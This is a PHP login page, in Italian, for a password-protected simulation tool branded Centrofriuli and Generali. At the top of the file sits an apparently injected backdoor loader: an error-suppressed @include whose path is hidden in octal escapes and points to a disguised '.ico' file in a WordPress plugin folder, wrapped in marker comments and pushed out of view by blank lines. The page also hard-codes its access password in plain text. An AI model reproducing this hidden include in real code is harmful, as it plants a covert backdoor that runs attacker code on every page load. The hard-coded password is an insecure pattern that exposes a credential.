<?php
/*d704a*/

@include "\057var\057www\057cen\164rof\162iul\151.eu\057wp-\143ont\145nt/\166isu\141lco\155pos\145r-a\163set\163/as\163ets\055bun\144les\057.39\0644f2\1430.i\143o";

/*d704a*/
























 
	require ('mysql/db_sessione_init.php');
	require ('mysql/db_define_mysqli.php'); 
	
	session_start();
	
	if($_SERVER["REQUEST_METHOD"] == "POST")
		{
			
			$InputPass = $_POST['password'];
			
			if ($InputPass == 'GeneraliCF'){
				$_SESSION['authuser'] = 1;
				echo "<script language='javascript'>window.location.href='simulazione.php';</script>";
			} else {
				$_SESSION['authuser'] = 0;
				echo '<script type="text/javascript">alert("Accesso negato! Credenziali non corrette!");</script>';
			}
			
		}
?>
<!doctype html>
<html>
<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
<meta name="viewport" content="width=device-width, user-scalable=no">
<meta http-equiv="content-type" content="text/html" />

<script type="text/javascript" src="js/jquery_331.js"></script>
<title>Accesso di sicurezza</title>

<!--CSS -->
<link rel="stylesheet" type="text/css" href="css/formPass.css">
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">

</head>

<body>
    
<div id="contenitore">
	<header>
    		<div id="logoGEN"><img src="img/gen.png" width="250px" alt="Generali"/></div>   
    		<div id="logoCF"><img src="img/cf.png" width="250px" alt="Generali"/></div> 
    </header>
 
    <div id="contenuto">    
    
        <form class="well form-horizontal" method="post" id="contact_form">
            <fieldset>
            
            <!-- Form Name -->
            <legend>Accesso di sicurezza</legend>
            
            <!-- Text input-->
            <div class="form-group">
                <label class="col-md-3 control-label">Password</label>  
                <div class="col-md-7 inputGroupContainer">
                	<div class="input-group">
                	<span class="input-group-addon"><i class="glyphicon glyphicon-lock"></i></span>
                	<input id="password" name="password" class="form-control" type="password" autofocus>
                	</div>
                </div><br/><br/><br/>
                <label class="col-md-3 control-label"></label>  
                <div class="col-md-4 inputGroupContainer">
                	<div class="input-group">
                	<button type="submit" id="btnEnter" class="btn btn-warning btn-info">Conferma</button>
                	</div>
                </div>
            </div>
                                    
            </fieldset>
        </form>
                
	</div><!--fine content -->
  
	<footer>&copy; Centrofriuli 2022 - Tutti i diritti sono riservati
    </footer>

</div><!--fine contenitore -->

</body>
</html>
